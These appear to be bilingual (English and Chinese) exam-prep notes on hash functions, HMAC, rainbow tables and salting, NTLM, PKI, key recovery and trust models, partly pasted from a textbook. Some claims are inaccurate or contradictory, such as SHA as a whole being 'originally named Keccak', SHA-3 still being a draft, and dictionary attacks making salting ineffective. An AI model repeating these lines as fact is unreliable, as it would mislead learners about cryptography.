MD4 algorithm then processes 512-bit blocks of the message in 3 rounds of computation.
The final output is a 128-bit message digest.
The MD2, MD4, and MD5 algorithms are no longer accepted as suitable hashing functions. However, the details of the algorithms may still appear on the CISSP exam.
Several mathematicians have published papers documenting flaws in the full version of MD4:
Hans Dobbertin published a paper in 1996 outlining how a modern PC could be used to find collisions for MD4 message digests in less than one minute. Then MD4 is no longer a secure hashing algorithm, the use should be avoided if at all possible.
MD5 Message Digest hash algorithm
- 1991, Rivest released message digest algorithm, MD5.
- It also processes 512-bit blocks of the message.
  - MD5 has the same padding requirements as MD4.
  - the message length must be 64 bits less than a multiple of 512 bits.
  - a common hashing algorithm, produces 128-bit hash.
  - not a stream of 1s and 0s.
  - MD5 hash is displayed as 32 hexadecimal characters instead of 128 bits.
  - Hexadecimal characters are composed of 4 bits and use the numbers 0 through 9 and the characters a through f.
- but it uses 4 distinct rounds of computation to produce a digest of the same length as the MD2 and MD4 algorithms (128 bits) (16byte) Hash 值.
  - 将可变⻓度的数据集映射为固定⻓度的数据集。
  - (将消息分割成 512-bit 数据块。填补消息到末尾以确保其⻓度能 除以512)。
  - 通过 MD5 算法处理，其结果将是一个128位的散列值。
  - 使用MD5后，生成的散列值通常是32位16进制的数字。
  - plaintext = message，加密后所生成的 Hash = (message) digest
优点:
- MD5 implements additional security features,
- but reduce the speed of message digest production significantly. 生成速度
快且易于实现?
MD5 has been in use since 1992. Experts discovered significant vulnerabilities in MD5 in 2004 and later years.
As processing power of computers increased, it became easier and easier to exploit these vulnerabilities.
Security experts now consider it cracked and discourage its use.
disadventage:
- 容易被暴力攻击和字典攻击(使用彩虹表快速地搜索已知 Hash 对应的
原数据).
- MD5 并没有避免 Hash 碰撞, subject to collisions, preventing its use for ensuring message integrity.
  - Arjen Lenstra and others demonstrated in 2005, it is possible to create two digital certificates from different public keys that have the same MD5 hash.
  - November 2007, researchers published their findings of the ability to have two entirely different Win32 executables with different functionality but the same MD5 hash. This discovery has obvious implications for the development of malware. - 如果仍使用 MD5，可以加 salt 进一步保证安全性
SHA Secure Hash Algorithm
- government standard hash functions
- developed by the National Institute of Standards and Technology (NIST)
and the National Security Agency (NSA).
- originally named Keccak and designed by Guido Bertoni, Joan Daemen,
Michaël Peeters, and Gilles Van Assche.
- the Secure Hash Standard (SHS), also known as Federal Information
Processing Standard (FIPS) 180-2and180-3.
  - Specified official government publication
- designed to ensure the integrity of a message.
  - SHA 碰撞的几率小于 MD5。碰撞的发生非常罕⻅。
- 生成的 Hash 安全性比 MD5 更强, 之外其它都与 MD5 非常类似
  - 通常越⻓的 Hash 越难破解，这是核心思想。
- several variations of SHA:
- SHA-0, SHA-1, SHA- 2, and SHA-3: SHA-0: is not used. SHA-1, 160-bit message digest, 512-bit blocks.
- SHA-1, 1993, was designed as the algorithm to be used for secure hashing in
the U.S. Digital Signature Standard (DSS).
- SHA-1 takes input of virtually any length (in reality, there is an upper bound
of approximately 2,097,152 terabytes on the algorithm).
- similar to the MD5 hash except that it creates 160-bit hashes instead of 128-
bit hashes.
- if the message length is not a multiple of 512.
  - pads the message with additional data
  - Until length reaches the next highest multiple of 512.
- SHA-1 was one of the more secure hash functions at that time, but it has been found vulnerable to a collision attack, no longer approved for use by government agencies.
SHA-2 improved SHA-1 to overcome potential weaknesses.
- includes four versions.
- SHA-224, SHA-256, SHA-384, and SHA-512.
  - SHA-256, 256-bit message digest, 512-bit block size.
  - SHA-224, 224-bit message digest, 512-bit block size.
  - truncated version of the SHA-256.
  - SHA-384, 384-bit message digest, 1,024-bit block size.
  - truncated version of the SHA-512
  - SHA-512, 512-bit message digest, 1,024-bit block size.
- similar to SHA-1, accept input of less than 264 bits and reduces that input to a hash. - The SHA-2 produces a hash length equal to the number after SHA, so SHA-256 produces a digest of 256 bits.
- The SHA-2 series became more common after SHA-1 was shown to be potentially vulnerable to a collision attack.
SHA-3 (Keccak) is an alternative to SHA-2.
- The U.S. National Security Agency (NSA) created SHA-1 and SHA-2.
- SHA-3 was created outside of the NSA and was selected in a non-NSA
public competition.
- It can create hashes of the same size as SHA-2 (224 bits, 256 bits, 384 bits,
and 512bits).
The cryptographic community generally considers the SHA-2 algorithms secure,
but they theoretically suffer from the same weakness as the SHA-1 algorithm.
- In 2012, the federal government announced the selection of the Keccak algorithm as the SHA-3 standard. However, the SHA-3 standard remains in draft form and some technical details still require finalization.
- Observers expect that, once NIST finalizes SHA-3, SHA-2 will remain an accepted part of NIST’s Secure Hash Standard (SHS) until someone demonstrates an effective practical attack against SHA-2.
- SHA-2 and SHA-3: currently approved for use.
- SHA-1 has been discontinued.
Some host-based intrusion detection systems (HIDSs) and antivirus software capture hashes of files on a system when they first scan it and include valid hashes of system files in signature definition files. When they scan a system again, they can capture hashes of executable and system files and compare them with known good hashes. If the hashes are different for an executable or system file, it indicates the file has been modified, and it may have been modified by malware.
HMAC
Hashed Message Authentication Code (HMAC) algorithm
- implements a partial digital signature
- it guarantees the integrity of a message during transmission, but it does not
provide for nonrepudiation.
- a fixed-length string of bits similar to other hashing algorithms such as MD5 and SHA-1 (known as HMAC-MD5 and HMAC-SHA1).
HMAC uses a shared secret key to add some randomness to the result and only the sender and receiver know the secretkey.
HMAC can be combined with any standard message digest generation algorithm, like SHA-2, by using a shared secret key.
- only communicating parties know the key can generate / verify the digital signature/hash.
- If the recipient decrypts the message digest but cannot successfully compare it to a message digest generated from the plaintext message, that means the message was altered in transit.
Because HMAC relies on a shared secret key, it does not provide any nonrepudiation functionality (as previously mentioned).
- However, it operates in a more efficient manner than the digital signature standard described in the following section and may be suitable for applications in which symmetric key cryptography is appropriate.
- In short, it represents a halfway point between unencrypted use of a message digest algorithm and computationally expensive digital signature algorithms based on public key cryptography.
Example:
- one server is sending a message to another server using HMAC- MD5.
- It starts by first creating a hash of a message with MD5 and then uses a secret key to complete another calculation on the hash.
- The server then sends the message and the HMAC-MD5 hash to the second server.
- The second server performs the same calculations and compares the received HMAC-MD5hash with its result.
- if the two hashes are the same, the message retained integrity, if different, the message lostintegrity.
The HMAC provides both integrity and authenticity of messages.
- The MD5 portion of the hash provides integrity just as MD5 does. However, because only the server and receiver know the secret key, if the receiver can calculate the same HMAC-MD5 hash as the sender, it knows that the sender used the same key.
- If an attacker was trying to impersonate the sender, the message wouldn’t pass this authenticity check because the attacker wouldn’t have the secret key.
Internet Protocol security (IPsec) and Transport Layer Security (TLS) often use a version of HMAC such as HMAC-MD5 and HMAC-SHA1.
Using HMAC
- If an attacker can change the message, the attacker change the hash too. calculate the hash on the modified message and replace the original hash with the modified hash.  ▪


## - Hash created on Lisa’s computer: D9B93C99B62646ABD06C887039053F56
- Modified hash inserted by attacker after modifying the message: 564294439E1617F5628A3E3EB75643FE
- Hash created for modified message on Bart’s computer: 564294439E1617F5628A3E3EB75643FE
- The calculated hash on the modified message would be the same as the received hash. This erroneously indicates that the message maintained integrity.
- HMAC helps solve this problem.
- With HMAC, both Lisa and Bart’s computers would know the same secret
key and use it to create an HMAC-MD5 hash instead of just an MD5 hash.  ▪


## - Lisa is still sending the same message.
- The MD5 hash is D9B93C99B62646ABD06C887039053F56.
- after applying the HMAC secret key, the HMAC-MD5 hash:733C70A54A13744D5C2C9C4BA3B15034.
  - For brevity, shortened to first five characters (733C7) in the figure.
- attacker can modify the message in transit just as before. However, the
attacker doesn’t know the secret key, so he can’t calculate the HMAC hash.
- Bart’s computer calculates the HMAC-MD5 hash on the received message
using the shared secret key.
- It then compares the calculated hash with the hash received from Lisa:
- HMAC-MD5 hash created on Lisa’s computer:733C70A54A13744D5C2C9C4BA3B15034
- HMAC-MD5 hash created on Bart’s computer:1B4FF0F6C04434BF97F1E3DDD4B6C137
- hashes are different and the message has lost integrity.
- If the messages weren’t modified, the HMAC-MD5 hash wouldbe the same. RIPEMD
RACE Integrity Primitives Evaluation Message Digest
- based on MD4.
- isn’t as widely as MD5, SHA, and HMAC.
- It originally provided a 128-bit hash
  - later shown to have problems with collisions. There were questions regarding its security.
  - RIPEMD was strengthened to a 160-bit hash, RIPEMD-160
  - by Hans Dobbertin, Antoon Bosselaers, and Bart Preneel.
  - uses 160 bits.
- Different versions create different size hashes.
  - RIPEMD-160 creates 160-bit, fixed-size hashes.
  - Other versions create hash sizes of 128 bits, 256 bits, and 320 bits (RIPEMD-256 and RIPEMD-320, respectively).
- is a hashing function developed by the RACE Integrity Primitives Evaluation (RIPE) consortium.
RIPEMD-160
- RIPEMD-160 is an algorithm based on MD4, but uses 2 parallel channels with 5 rounds. - The output consists of five 32-bit words to make a 160-bit hash.
- There are also larger output extensions of the RIPEMD-160 algorithm.
  - Extensions:
  - RIPEMD-256 and RIPEMD-320, outputs of 256 bits and 320
bits
  - While offer larger output sizes, does not make the hash function stronger.
Rainbow Tables and Salt
Hashing algorithm is not reversible but possible to break.
- particularly important, passwords are often stored as a hash.
- Rainbow tables are one such method.
Rainbow table:
- All possible hashes are computed in advance. Precomplied hashes.
- create a series of tables; (all the possible two-letter, three-letter, four-letter, and so forth combinations and the hash of that combination), using known hashing algorithm like SHA-2.
- search the table for a given hash, the letter combination in the table that produced the same hash must be the password that you are seeking.
  - Example Popular password cracking tools:
  - OphCrack, use rainbow tables.
- A rainbow table is generally an offline only attack.
- Cryptography for storing important data such as passwords in a database.
- It uses less compute cycles than any other forms of attack Salt
- A counter-measure
- addition of bits at key locations, either before or after the hash.
  - if you type in the password letmein, bits are added by the operating system before it is hashed.
  - Pseudo-random data added to a password before hashing. ⁃
主要目的:
  - 使用 salting 让生成的 MD5 更加安全: but並不是 MD5 所特有的,
     你同样可以把它应用在其它算法中。
  - 将原本一次比较变为多次比较从而减慢对密码 Hash 值的猜测，
否则对 Hash 密码库的破解效率将是非常之高。
  - 在 Java 中需要使用 SecureRandom 来生成一个好的 salt 值，可以 利用“SHA1PRNG” 算法来生成伪随机数。
重要提示:请注意，现在你必须每一个密码 Hash 存储它 slat 值。因为当用 户登录系统，你必须使用最初生成的 slat 来再次生成 Hash 与存储的 Hash 进行匹配。如果使用不同的 slat(生成随机 slat)那么生成的 Hash 将不同。
  a type of additional input that increases password complexity
  - provides better protection against brute-force, dictionary, and
rainbow table attacks.
   - 防止预先被计算好的彩虹表攻击: Using Salt, should someone apply a rainbow table attack, the hash they search for will yield a letter combination other than what you actually typed in.
  - Rainbow tables would salting of passwords render ineffective 多次 Hash 和加 salt: 创建自定义的组合，如:salt+password+salt => hash
  - 实际上没必要，因为这并不能帮助你进一步巩固 Hash 的安全 性。如果你需要更高的安全性，正确的做法应该去选择一个更好 的算法。
Dictionary cryptographic attacks would render salting of passwords ineffective
 LANMAN
Prior to the release of Windows NT, Microsoft’s operating systems used the LANMAN protocol for authentication.
While functioning only as an authentication protocol, LANMAN used LM Hash and two DES keys.
It was replaced by the NT LAN Manager (NTLM) with the release of Windows NT. NTLM NT LAN Manager
Microsoft replaced the LANMAN protocol with NTLM. with the release of Windows NT.
NTLM uses MD4/MD5 hashing algorithms.
Several versions exist (NTLMv1, NTLMv2)
still in widespread use despite the fact that Microsoft has pointed to Kerberos as being its preferred authentication protocol.
Although LANMAN and NTLM both employ hashing, but primarily purpose is authentication. GOST
a symmetric cipher developed in the old Soviet Union
has been modified to work as a hash function.
Processes variable-length message into fixed-length 256 bits output.
Public Key Infrastructure
A public key infrastructure (PKI) is a set of roles, policies, and procedures needed to create, manage, distribute, use, store, and revoke digital certificates [1] and manage public-key encryption.
public key encryption’s major strength: ability to facilitate communication between parties previously unknown to each other. facilitate the secure electronic transfer of information for a range of network activities such as e- commerce, internet banking and confidential email.
- Made possible by (PKI) public key infrastructure 基础设施 hierarchy 等级制 度 of trust relationships.
- able to find and access public keys on demand. PKI framework exists to manage, create, store and distribute keys and digital certificates safely and securely.
- the component of PKI:
  - Certificate authority (CA): the entity responsible for enrollment, creation, management, validation and revocation of digital certificates. (key element in a PKI)
  - Registration authority (RA): the entity responsible for accepting info about a party wishing to obtain a certificate
  - RAs generally do not issue or manage certificates.
  - in some situation, entities known as local registration authorities (LRAs) are delegated the ability to issue certificate by a CA.
  - Certificate revocation list (CRL): a list of revoked certificates, published by CA.
  - Digital certificates: prices of information. Used to positively prove the identity.
  - Certificate distribution system: a combination of software, hardware, services, and procedures used to distribute certificates.
  - A PKI is made up of hardware, applications, policies, services, programming interfaces, cryptographic algorithms, protocols, users, and utilities.
- implementing a PKI boils down to establishing a level of trust.
- a group of technologies used to request, create, manage, store, distribute, and
revoke digital certificates.
- These trusts permit combining asymmetric cryptography with symmetric cryptography along with hashing and digital certificates, giving us hybrid cryptography.
 - a hierarchical system for the creation, management, storage, distribution, and revocation of digital certificates - Asymmetric encryption depends on the use of certificates for a variety of purposes:
  - protecting email and Internet traffic with SSL and TLS.
  - HTTPS sessions protect Internet credit card transactions, and these
transactions depend on a PKI.
- primary benefit of a PKI: it allows two people or entities to communicate
securely without knowing each other previously.
  - allows communicate securely through an insecure public medium: like Internet.
  - small groups: possible for users to exchange public keys based on a previously established level of trust.
  - big organizations: PKI provides solution: provides a mechanism through which keys can be generated and bound to a digital certificate that can be viewed and validated by all parties.
  - public keys must be distributed or stored in a secure manner that prevents the keys from being tampered with or altered in any way.
  - Example
  - establish a secure session with Amazon.com even if you’ve never done
so before.
  - Amazon purchased a certificate from Symantec.
  - the certificate provides the ability to establish a secure session. ▪


## Key Recovery
When individual leaves an organization on less-than-ideal terms. Retrieve the key is impossible.
There must be a safeguards to retrieve keys or provide backup mechanisms.
key escrow: delegate responsibility of keys to a trusted third party.
(Key escrow agent)
Most key escrow systems have 3 main components: a User Security Component (USC)
  - The USC encrypts and decrypts the data.
  - It often incorporates a Data Recovery Field (DRF) in the
message to facilitate key recovery. a Key Escrow Component (KEC)
  - The KEC stores the data recovery key(s) a Data Recovery Component (DRC).
  - DRC performs the recovery of the plaintext from the encrypted text using the piece(s) from the KEC and the DRF set up by the USC [16].
1 Multiple Agent Based Scheme
Lim, Kang, and Sohn: architecture for key recovery based on Multiple 3,334

Agent Based scheme.
The keys are encapsulated with the message and sent to a randomly selected, secretly chosen recovery agent. The keys are reconstructed after the recovery request is certified.
The basic scenario consists of three phases:
(1) initialization: public keys are set and distributed for all agents. These keys are distributed with certificates to authenticate them.
(2) communication and key recovery information generation: a key agent randomly chooses a key recovery agent (KRA) to use. The key recovery information is generated using the public keys of the key recovery center (KRC) and the KRA. This information is used inside the message along with the cipher text.
(3) key recovery: a user realizes the need to perform key recovery. The authorization is certified by an agent. This agent contacts the KRC. The KRC gathers the key recovery information (KRI) from the appropriate KRA(s) and returns the information to the user.
2 Proactive Secret-Sharing
Numao: key registration system based on distributed secret sharing called Proactive Secret-Sharing.
Rather than registering the key with a single key recovery agent, multiple agents are involved. The key cannot be retrieved or reconstructed without some minimum number of these agents.
In this way, no single point of attack is available for exploitation.
This is commonly called a (t,n)-threshold scheme, as t servers (or agents) must cooperate to recover the key. In the proposed scheme, the secret is never revealed when the message is decrypted.
Proactive secret-sharing: the sharing is planned and performed at the time the key is created.
This secret sharing scheme consists of 3 basic steps:
key registration:
  - the session keys used for specific messages are encrypted with the public key of the key recovery agent.
  - This information is attached to that message.
  - In this case, the key escrow is performed by the user(s) who hold the message, rather than a single escrow agent. The user retains privacy while still allowing for key recovery.
secret sharing:
  - the secret, after encryption, is split up and distributed among a number of different agents.
  - These agents have no information with which they alone can reconstruct the key or decrypt the message.
key recovery:
  - the user sends a request for reconstruction of the secret to at least t+1 servers, along with the encrypted key portion of the message.
  - These servers each authenticate the request, and apply their pieces of the secret to the encrypted key to partially decrypt it. is based on an ElGamal encryption scheme.
⁃
3 Key Recovery Entry
Al-Salqan [12] proposes the Key Recovery Entry scheme. It is a key recovery system that adds a small field to a message when it is transmitted. It also relies on a Certificate Authority (CA) body to authenticate requests and provide a key that opens the extra field. The author breaks his approach into four cases: (1) no key recovery, (2) recovery of session key, (3) recovery of private keys, and (4) PGP key recovery. For the first case, the normal encryption and decryption steps are performed for the algorithm used. A session key is used, along with private keys for each user. Both the private key and the session key are needed to decrypt the message. If either key is forgotten, the message cannot be recovered. For the second case, a CA is used to uniquely identify individuals. These certificates are retained in a database. The CA stores the answers to a series of questions such as mother’s maiden name, etc. The public key is stored with the answers. When an encrypted message is sent, an additional field is added to the message. This is the key recovery entry (KRE). It includes the session key and the public key of the recipient, as stored with the CA. If the recipient has lost his private key, the message may still be decrypted by contacting the CA and responding to the stored questions. If the answers match, the session key is provided. For the third case, a session key does not exist that will allow decryption of the message. Whenever a private key is created or updated using a key package, a key recovery file is also created. This file contains the private key, secured with a password created by a hash of the verification answers stored
with the CA. The CA holds the key for decrypting this file. If the private key is forgotten, the recovery file is used to retrieve the key. In the final case, there exists no CA. In this case, a lightweight certificate authority ▪


## (LCA) must be added to the system. It is responsible for storing the public key and verification answers. Key recovery is similar to the cases already discussed.
M of N
A key is broken into multiple pieces.
the pieces are distributed in different combinations to trusted parties.
when key is needed, some (but not all) holders must be present to be able to reassemble the key.
useful in situations:
  - key needs to be easily recoverable
  - key is used in particularly sensitive operations.
key lifetime
key used more frequently: shorter lifespans.
  - more info an attacker can analyze to determine the key keys used less frequently: longer lifespans.
     ▪


##  the usage: temporary vs permanent.
end of lifetime: cannot simply erased, must be carefully destroyed
using the proper technique suitable for the environment. have policies in place to handle compromised keys in an efficient and timely manner.
  - key zeroization:
  - technique used during the key destruction process.
  - activity of clearing all the recorded data about the key and leading only zeros in its place.
  - prevent the recovery of keys from media or a system using file recovery or forensics techniques.
  - keys in file can be copied. No way to ensure the destruction.
Suspension
- Instead of being revoked, a certificate can be suspended, meaning it is temporarily put on hold.
- example:
◦ Bob is taking an extended vacation and wants to ensure that his certificate
will not be used during that time,
◦ he can make a suspension request to the CA.
◦ The CRL would list this certificate and its serial number, and in the field
that describes why the certificate is revoked, it would instead indicate
a hold state.
◦ Once Bob returns to work, he can make a request to the CA to remove his
certificate from the CRLlist.
- Another reason to suspend a certificate is if an administrator is suspicious that
a private key might have been compromised. While the issue is under
 investigation, the certificate can be suspended to ensure that it cannot be used.
Key Destruction
- Key pairs and certificates have set lifetimes, meaning that they will expire at some specified time.
- It is important that the certificates and keys are properly destroyed when that time comes
◦ wherever the keys are stored (on users’ workstations, centralized key servers, USB token devices, smart cards, and so on).
◦ The goal is to make sure that no one can gain access to a key after its lifetime has ended and use this key for malicious purposes.
- An attacker might use the key to digitally sign or encrypt a message with the hopes of tricking someone else about his identity (this would be an example of a man-in-the-middle attack).
- Also, if the attacker is performing some type of brute-force attack on your cryptosystem, trying to figure out specific keys that were used for encryption processes, obtaining an old key could give him more insight into how your cryptosystem generates keys. The less information you supply to potential hackers, the better.
- Note that in modern PKIs, encryption key pairs usually must be retained long after they expire so that users can decrypt information that was encrypted with the old keys. example, if Bob encrypts a document using his current key and the keys are updated three months later, Bob’s software must maintain a copy of the old key so he can still decrypt the document. In the PKI world, this issue is referred to as key history maintenance.
Private Key Protection
- Although a PKI implementation can be complex, with many different components and options, a critical concept common to all PKIs must be understood and enforced: the private key needs to stay private. A digital signature is created solely for the purpose of proving who sent a particular message by using a private key. This rests on the assump- tion that only one person has access to this private key. If an imposter obtains a user’s private key, authenticity and nonrepudiation can no longer be claimed or proven.
- When a private key is generated for the first time, it must be stored somewhere for future use. This storage area is referred to as a key store, and it is usually created by the application registering for a certificate, such as a web browser, smart card software, or other application. In most implementations, the application will prompt the user for a password, which will be used to create an encryption key that protects the key store. So, example, if Cheryl used her web browser to register for a certificate, her private key would be generated and stored in the key store. Cheryl would then be prompted for a password, which the software would use to create a key that will encrypt the key store. When Cheryl needs to access this private key later that day, she will be prompted for the same password, which will decrypt the key store and allow her access to her private key.
- Unfortunately, many applications do not require that a strong password be created to protect the key store, and in some implementations the user can choose not to provide a password at all. The user still has a private key available, and it is bound to the user’s identity, so why is a password even necessary? If, example, Cheryl decided not to use a password, and another person sat down at her computer, he could use her web browser and her private key and digitally sign a message that contained a nasty virus. If Cheryl’s coworker Cliff received this message, he would think it came from Cheryl, open the message, and download the virus. The moral to this story is that users should be required to provide some type of authentication information (password, smart card, PIN, or the like) before being able to use private keys. Otherwise, the keys could be used by other individuals or imposters, and authentication and nonrepudiation would be of no use.
- Because a private key is a crucial component of any PKI implementation, the key itself should contain the necessary characteristics and be protected at each stage of its life. The following list sums up the characteristics and requirements of proper private key use:
- ●● The key size should provide the necessary level of protection for the environment.
- ●●
- ●●
- ●●
- ●●
The lifetime of the key should correspond with how often it is used and the sensitivity of the data it is protecting.
The key should be changed and not used past its allowed lifetime.
Where appropriate, the key should be properly destroyed at the end of its lifetime.
The key should never be exposed in clear text. - ●● No copies of the private key should be made if it is being used for digital signatures.
- ●● The key should not be shared.
- ●● The key should be stored securely.
- ●● Authentication should be required before the key can be used.
- ●● The key should be transported securely.
- ●● Software implementations that store and use the key should be evaluated to ensure they provide the necessary level of protection.
If digital signatures will be used for legal purposes, these points and others may need to be audited to ensure that true authenticity and nonrepudiation are provided.
CA Private Key
The most sensitive and critical public/private key pairs are those used by CAs to digitally sign certificates. These need to be highly protected because if they were compromised, the trust relationship between the CA and all of the end-entities would be threatened. In high-security environments, these keys are often kept in a tamper- proof hardware encryption store, only accessible to individuals with a need to access.
Key Recovery
- One individual could have one, two, or many key pairs that are tied to his or her iden- tity. That is because users can have different needs and requirements for public/private key pairs. As mentioned earlier, certificates can have specific attributes and usage require- ments dictating how their corresponding keys can and cannot be used. example, David can have one key pair he uses to encrypt and transmit symmetric keys. He can also have one key pair that allows him to encrypt data and another key pair to perform digital signatures. David can also have a digital signature key pair for his work-related activities and another pair for personal activities, such as e-mailing his friends. These key pairs need to be used only for their intended purposes, and this is enforced through certificate attributes and usage values. - If a company is going to perform and maintain a key recovery system, it will generally back up only the key pair used to encrypt data, not the key pairs that are used to generate digital signatures. The reason that a company archives keys is to ensure that if a person leaves the company, falls off a cliff, or for some reason is unavailable to decrypt important company information, the company can still get to its company- owned data. This is just a matter of the organization protecting itself. A company would not need to be able to recover a key pair that is used for digital signatures, since those keys are to be used only to prove the authenticity of the individual who sent a message. A company would not benefit from having access to those keys and really should not have access to them, since they are tied to one individual for a specific purpose.
- Two systems are important for backing up and restoring cryptographic keys: key archiving and key recovery. The key archiving system is a way of backing up keys and securely storing them in a repository; key recovery is the process of restoring lost keys to the users or the company. Recovery agent is the term for an entity who is given a public key certificate for recovering user data that is encrypted. This is the most common type of recovery policy used in PKI, but adds the risk of the recovery agent having access to secured information.
- If keys are backed up and stored in a centralized computer, this system must be tightly controlled, because if it were compromised, an attacker would have access to all keys for the entire infrastructure. Also, it is usually unwise to authorize a single person to be able to recover all the keys within the environment, because that person could use this power for evil purposes instead of just recovering keys when they are needed for legitimate purposes. In security systems, it is best not to fully trust anyone.
- EXAM TIP Key archiving is the process of storing a set of keys to be used as a backup should something happen to the original set. Key recovery is the process of using the backup keys.
- Dual control can be used as part of a system to back up and archive data encryption keys. PKI systems can be configured to allow multiple individuals to be involved in any key recovery process. When a key recovery is required, at least two people can be required to authenticate by the key recovery software before the recovery procedure is performed. This enforces separation of duties, which means that one person cannot complete a critical task by himself. Requiring two individuals to recover a lost key together is called dual control, which simply means that two people have to be present to carry out a specific task. - This approach to key recovery is referred to as the m of n authentication, where n number of people can be involved in the key recovery process, but at least m (which is a smaller number than n) must be involved before the task can be completed. The goal is to minimize fraudulent or improper use of access and permissions. A company would not require all possible individuals to be involved in the recovery process, because getting all the people together at the same time could be impossible considering meetings, vacations, sick time, and travel. At least some of all possible individuals must be available to participate, and this is the subset m of the number n. This form of
•
- secret splitting can increase security by requiring multiple people to perform a
specific function. Requiring too many people can increase issues associated with availability, while requiring too few increases the risk of a small number of people compromising a secret.
- EXAM TIP Secret splitting using m of n authentication schemes can improve security by requiring that multiple people perform critical functions, preventing a single party from compromising a secret.
- All key recovery procedures should be highly audited. The audit logs should capture at least what keys were recovered, who was involved in the process, and the time and date. Keys are an integral piece of any encryption cryptosystem and are critical to a PKI environment, so you need to track who does what with them.
Key Escrow
- Key recovery and key escrow are terms that are often used interchangeably, but they actu- ally describe two different things. You should not use them interchangeably after you have read this section.
- Key recovery is a process that allows for lost keys to be recovered. Key escrow is a process of giving keys to a third party so that they can decrypt and read sensitive information when this need arises. Key escrow almost always pertains to handing over encryption keys to the government, or to another higher authority, so that the keys can be used to collect evidence during investigations.
- A key pair used in a person’s place of work may be required to be escrowed by the employer, for obvious reasons. First, the keys are the property of the enterprise, issued to the employee for use. Second, the firm may have need for them after an employee leaves the firm. Key escrow by businesses can make total sense, provided that the escrowed keys are stored in a manner to prevent their unauthorized use. - EXAM TIP Key escrow, allowing another trusted party to hold a copy of a key, has long been a controversial topic.This essential business process provides continuity should the authorized key-holding party leave an organization without disclosing keys.The security of the escrowed key is a
- concern, and it needs to be managed at the same security level as for the original key.
Public Certificate Authorities
- An individual or company may decide to rely on a CA that is already established and being used by many other individuals and companies— this would be a public CA.
- A company, on the other hand, may decide that it needs its own CA for internal use, which gives the company more control over the certificate registration and generation process and allows it to configure items specifically for its own needs. This second type of CA is referred to as a private CA (or in-house CA).
- A public CA specializes in verifying individual identities and creating and maintaining their certificates. These companies issue certificates that are not bound to specific companies or intercompany departments. Instead, their services are to be used by a larger and more diversified group of people and organizations. If a company uses a public CA, the company will pay the CA organization for individual certificates and for the service of maintaining these certificates. Some examples of public CAs are VeriSign (including GeoTrust and Thawte), Entrust, and GoDaddy.
- One advantage of using a public CA is that it is usually well known and easily accessible to many people. Most web browsers have a list of public CAs installed and configured by default, along with their corresponding root certificates. This means that if you install a web browser on your computer, it is already configured to trust certain CAs, even though you might have never heard of them before. So, if you receive a certificate from Bob, and his certificate was digitally signed by a CA listed in your browser, you can automatically trust the CA and can easily walk through the process of verifying Bob’s certificate. This has raised some eyebrows among security professionals, however, since trust is installed by default, but the industry has deemed this is a necessary approach that provides users with transparency and increased functionality. Users can remove these CAs from their browser list if they want to have more control over who their system trusts and who it doesn’t.
- Earlier in the chapter, the different certificate classes and their uses were explained. No global standard defines these classes, the exact requirements for obtaining these different certificates, or their uses. Standards are in place, usually for a particular country or industry, but this means that public CAs can define their own certificate classifications. This is not necessarily a good thing for companies that depend on public CAs, because it does not provide enough control to the company over how it should interpret certificate classifications and how they should be used.
- This means another component needs to be carefully developed for companies that use and depend on public CAs, and this component is referred to as the certificate policy (CP). This policy allows the company to decide what certification classes are acceptable and how they will be used within the organization. This is different from the CPS, which explains how the CA verifies entities, generates certificates, and maintains these certificates. The CP is generated and owned by an individual company that uses an external CA, and it allows the company to enforce its security decisions and control how certificates are used with its applications.
Trust Models
- A trust domain is a construct of systems, personnel, applications, protocols, technolo- gies, and policies that work together to provide a certain level of protection. All of these components can work together seamlessly within the same trust domain because they are known to the other components within the domain and are trusted to some degree. Different trust domains are usually managed by different groups of administrators, have different security policies, and restrict outsiders from privileged access.
- Most trust domains (whether individual companies or departments) are not usually islands cut off from the world—they need to communicate with other, less-trusted domains. The trick is to figure out how much two different domains should trust each other, and how to implement and configure an infrastructure that would allow these two domains to communicate in a way that will not allow security compromises or breaches. This can be more difficult than it sounds.
- One example of trust considered earlier in the chapter is the driver’s license issued by the DMV. Suppose, example, that Bob is buying a lamp from Carol and he wants to pay by check. Since Carol does not know Bob, she does not know if she can trust him or have much faith in his check. But if Bob shows Carol his driver’s license, she can compare the name to what appears on the check, and she can choose to accept it. The trust anchor (the agreed-upon trusted third party) in this scenario is the DMV, since both Carol and Bob trust it more than they trust each other. Since Bob had to provide documentation to prove his identity to the DMV, that organization trusted him enough to generate a license, and Carol trusts the DMV, so she decides to trust Bob’s check.
- Consider another example of a trust anchor. If Joe and Stacy need to communicate through e-mail and would like to use encryption and digital signatures, they will not trust each other’s certificate alone. But when each receives the other’s certificate and sees that they both have been digitally signed by an entity they both do trust—the CA—then they have a deeper level of trust in each other. The trust anchor here is the CA. This is easy enough, but when we need to establish trust anchors between different CAs and PKI environments, it gets a little more complicated.
- When two companies need to communicate using their individual PKIs, or if two departments within the same company use different CAs, two separate trust domains are involved. The users and devices from these different trust domains will need to communicate with each other, and they will need to exchange certificates and public keys. This means that trust anchors need to be identified, and a communication channel must be constructed and maintained.
- A trust relationship must be established between two issuing authorities (CAs). This happens when one or both of the CAs issue a certificate for the other CA’s public key, as shown in Figure 24-9. This means that each CA registers for a certificate and public key from the other CA. Each CA validates the other CA’s identification information and generates a certificate containing a public key for that CA to use. This establishes a trust path between the two entities that can then be used when users need to verify other users’ certificates that fall within the different trust domains. The trust path can be unidirectional or bidirectional, so either the two CAs trust each other (bidirectional) or only one trusts the other (unidirectional).
- As illustrated in Figure 24-9, all the users and devices in trust domain 1 trust their own CA 1, which is their trust anchor. All users and devices in trust domain 2 have their own trust anchor, CA 2. The two CAs have exchanged certificates and trust each other, but they do not have a common trust anchor between them.
- The trust models describe and outline the trust relationships between the different CAs and different environments, which will indicate where the trust paths reside. The trust models and paths need to be thought out before implementation to restrict and control access properly and to ensure that as few trust paths as possible are used. Several different trust models can be used: the hierarchical, peer-to-peer, and hybrid models are discussed in the following sections.
Figure 24-9 A trust relationship can be built between two trust domains to set up a communication channel.
Hierarchical Trust Model
- The first type of trust model we’ll examine is a basic hierarchical structure that contains a root CA, an intermediate CA, leaf CAs, and end-entities. The configuration is that of an inverted tree, as shown in Figure 24-10. The root CA is the ultimate trust anchor for all other entities in this infrastructure, and it generates certificates for the intermediate CAs, which in turn generate certificates for the leaf CAs, and the leaf CAs generate cer- tificates for the end-entities.
- Figure 24-10
- The hierarchical trust model out- lines trust paths.
- Chapter 24: Cryptographic Methods
- 481
- PART VI
- CompTIA Security+ All-in-One Exam Guide
- 482 •
- Intermediate CAs function to transfer trust between different CAs. These CAs
